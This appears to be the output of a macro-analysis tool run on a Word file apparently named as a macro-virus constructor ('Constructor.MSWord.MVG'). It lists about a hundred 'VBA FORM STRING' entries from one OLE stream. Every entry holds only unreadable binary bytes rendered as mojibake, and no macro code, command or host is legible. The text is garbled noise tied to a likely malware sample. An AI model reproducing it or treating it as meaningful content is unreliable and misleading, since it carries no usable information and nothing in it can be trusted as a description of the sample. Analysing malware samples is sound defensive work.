- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
}��<�e�J�ʶ�_���x���xu҄&�`
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H�m%U
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���>4�Q��TiK
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@p��RO�$@i5Bx>|�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
NP���q�#��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�an�4`
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-��8���I�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
MX�X�A9�4�i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
r��4�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`�3c�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@�A���C	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
QG�	��p�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�qۗ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1@7n�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Hc �
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
/fQ�[��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�!�8�P��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2�?�Y"��H�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���<a+��bT�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Q�r�L�қ���O��W��ֻ������gO���>f��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�
�{��m�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�0�����k\��`5�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�P�,fa���l
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�(F�1TA
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
h��YĂ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
,b��5�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1�I}�<�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@P��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[&�1�k
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ev� ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Q2��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��'Ӧ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�(��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
� u�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�q\��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�`G� �p
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��� q�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-�b��'
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�kǣc�q�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��"H�@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
e�&����<f
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�=b�]{
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
d�!N��z�U&b
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
h�G?��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Sc�Sc
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���S/
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��b��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
R@;K2
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��n�8N
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��aѳU
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Ȗj�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
� 
�@	��}8�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��~İ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b�BJq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Mۧ
} 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
� 
�p<
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�
�@
�C
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
x<��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
e'1�g��'
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
E@P��Ci`
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
z2M=�|
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J!	�P
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�p��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H�	��a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��	px
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
^(��
�0�G�cJq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��}��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
D�N+�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�f$1�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Y�Q_^9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
&7��l%1
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ra�����xn
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��zOu��%�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3�:�Ua�U���a\�r
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

 ��)K��N�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��=3��CX<��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
S��o�'���ݨ1]5
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�<�&�f�B
@=?�&���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�5VŶ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�w]��2"Qǥ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��i9!=ֵ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Y`G@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
� 
��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
P
7�	�0
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��	��
��

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@wNZ
"�~%�cb2\)�7c�f�q��#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
j��%�i7E��3P
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��26A
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
D�[�Eɠ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b��4�r
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�&��Ӧ��2^���j
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 
аB�t
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��
%A
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���H
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
6�_�霉�'6�a�!�b��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@�Vx
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����p
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$�`x��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
� x� 7�
�0���
�Ю��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2 �̹
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������(�ᙚ�(�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K_��<��a1�:~
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�1��@$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"����c��l@�Z���P(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
G:#@�l��f
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
7��K�:-���Y��)�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
mej2�I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-��i�A
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���:�8�l|�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Cun�hZ$3���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��.�:�IPa�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
aK&�y#�6
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
l{�
��I��0���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�G��W�V�
j{K���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
PU7�"�&<�x2�clbK&r�Bظ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
G4g
�l,TD��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��ݹUn�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�8l`�%.�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��a�˸7�mj3;
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)'�x�ȋ$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
o�$vv
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��-��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�0B�H
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
\U�;Vl�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Q2�e�򻉨c����l
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�п��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���7�@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Mɰ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�0�� 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ב���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
� 
�@
.�	��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
y��`�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�A	�`
�F
-------------------------------------------------------------------------------
